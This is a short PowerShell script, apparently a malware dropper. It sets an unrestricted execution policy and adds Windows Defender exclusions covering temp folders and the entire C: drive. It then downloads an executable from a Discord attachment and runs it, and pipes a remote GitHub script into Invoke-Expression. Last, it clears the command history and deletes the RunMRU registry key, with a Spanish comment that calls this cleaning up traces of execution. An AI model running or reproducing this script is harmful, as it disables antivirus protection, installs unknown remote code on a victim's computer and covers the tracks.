    Set-ExecutionPolicy unrestricted -Force;
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\" ;
    Add-MpPreference -ExclusionPath "$env" ;
    Add-MpPreference -ExclusionPath "$env:TEMP" ;
    Add-MpPreference -ExclusionPath "$env:temp/" ;
    Add-MpPreference -ExclusionPath "$env:/temp" ;
    Add-MpPreference -ExclusionPath "C:\Temp" ;
    Add-MpPreference -ExclusionPath "C:" ;
    Add-MpPreference -ExclusionPath "C:/*" ;
    Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/895907015614930984/1268572168074301451/distopan.exe?ex=66ace965&is=66ab97e5&hm=e9a96048cc908d906f69725a87634b8640fef7328090a9f6f638d36311fcab28&" -OutFile "$env:temp\rs.exe"; powershell "$env:temp\rs.exe";
    irm https://raw.githubusercontent.com/Chapelo/rs/main/rs3.ps1 | iex;
    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
    # Limpiar ejecucion de powershell
    Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU;
    

